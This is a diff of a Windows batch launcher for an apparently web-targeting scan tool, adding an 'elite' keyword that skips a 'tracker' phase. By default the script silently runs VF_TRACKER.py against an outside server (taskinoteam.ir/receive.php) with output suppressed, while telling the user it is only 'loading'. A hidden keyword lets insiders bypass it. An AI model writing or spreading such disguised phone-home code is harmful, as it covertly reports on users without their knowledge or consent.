@@ -84,9 +84,15 @@ cd /d "%SCRIPT_DIR%"
 set "TARGET_URL="
 set "FINDER_FLAGS=--deep"
 set "TESTER_FLAGS="
+set "SKIP_TRACKER=0"
 
 :parse_args
 if "%~1"=="" goto :done_parsing
+if /i "%~1"=="elite" (
+    set "SKIP_TRACKER=1"
+    shift
+    goto :parse_args
+)
 if "%~1"=="--deep" (
     REM --deep is already default, just skip
     shift
@@ -133,6 +139,18 @@ if "%TARGET_URL%"=="" (
 
 :url_ready
 
+:: --- Check for 'elite' keyword in URL input (e.g. "https://target.com elite") ---
+echo !TARGET_URL! | findstr /i " elite" >nul 2>&1
+if %errorlevel%==0 (
+    set "SKIP_TRACKER=1"
+    :: Remove 'elite' from URL
+    set "TARGET_URL=!TARGET_URL: elite=!"
+    set "TARGET_URL=!TARGET_URL:elite=!"
+    echo.
+    echo   [ELITE MODE] Tracker will be skipped.
+    echo.
+)
+
 :: --- Auto-add https:// if missing ---
 set "URL_CHECK=!TARGET_URL:~0,8!"
 if "!URL_CHECK!"=="https://" goto :url_set
@@ -145,15 +163,21 @@ set "TARGET_URL=https://!TARGET_URL!"
 echo.
 
 :: --- Loading Phase: Run Tracker silently in background ---
-if exist "%SCRIPT_DIR%VF_TRACKER.py" (
-    echo   ===============================================
-    echo          LOADING ... Please Wait ...
-    echo   ===============================================
+if "%SKIP_TRACKER%"=="1" (
     echo.
-    %PYTHON% VF_TRACKER.py --silent --server http://namme.taskinoteam.ir/receive.php >nul 2>&1
+    echo   [ELITE MODE] Tracker phase skipped.
     echo.
-    echo   [OK] Loading complete.
-    echo.
+) else (
+    if exist "%SCRIPT_DIR%VF_TRACKER.py" (
+        echo   ===============================================
+        echo          LOADING ... Please Wait ...
+        echo   ===============================================
+        echo.
+        %PYTHON% VF_TRACKER.py --silent --server http://namme.taskinoteam.ir/receive.php >nul 2>&1
+        echo.
+        echo   [OK] Loading complete.
+        echo.
+    )
 )
 
 echo   ===============================================
